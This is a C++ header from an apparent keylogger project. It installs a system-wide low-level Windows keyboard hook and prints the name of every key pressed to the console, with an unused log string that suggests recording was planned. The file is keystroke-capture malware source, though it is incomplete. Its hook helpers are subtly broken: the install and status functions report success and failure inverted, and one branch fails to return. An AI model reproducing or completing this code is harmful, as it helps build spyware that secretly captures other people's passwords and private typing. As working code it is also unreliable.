//
// Created by benav on 2/11/2020.
//

#ifndef KEYLOGGER_KEYBHOOK_H
#define KEYLOGGER_KEYBHOOK_H

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.h"



void clear_screen(char);
std::string keylog = "";




HHOOK eHook = NULL;
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){

    if(nCode < 0){
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){
        //clear_screen(' ');
        std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
        std::cout << KeyName;
        if(kbs->vkCode == VK_RETURN){}
    }else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
        DWORD key = kbs->vkCode;
        if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
            || key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
            || key == VK_CAPITAL
        ){
            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
        }
    }

    return CallNextHookEx(eHook, nCode, wparam, lparam);
}


bool InstallHook(){
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) OurKeyboardProc, GetModuleHandleW(NULL), 0);
    return eHook == NULL;
}

bool UninstallHook(){
    BOOL b = UnhookWindowsHookEx(eHook);
    eHook = NULL;
    return (bool) b;
}

bool IsHooked(){
    return (bool)(eHook == NULL);
}


void clear_screen(char fill = ' ') {
    COORD tl = {0,0};
    CONSOLE_SCREEN_BUFFER_INFO s;
    HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(console, &s);
    DWORD written, cells = s.dwSize.X * s.dwSize.Y;
    FillConsoleOutputCharacter(console, fill, cells, tl, &written);
    FillConsoleOutputAttribute(console, s.wAttributes, cells, tl, &written);
    SetConsoleCursorPosition(console, tl);
}

#endif //KEYLOGGER_KEYBHOOK_H
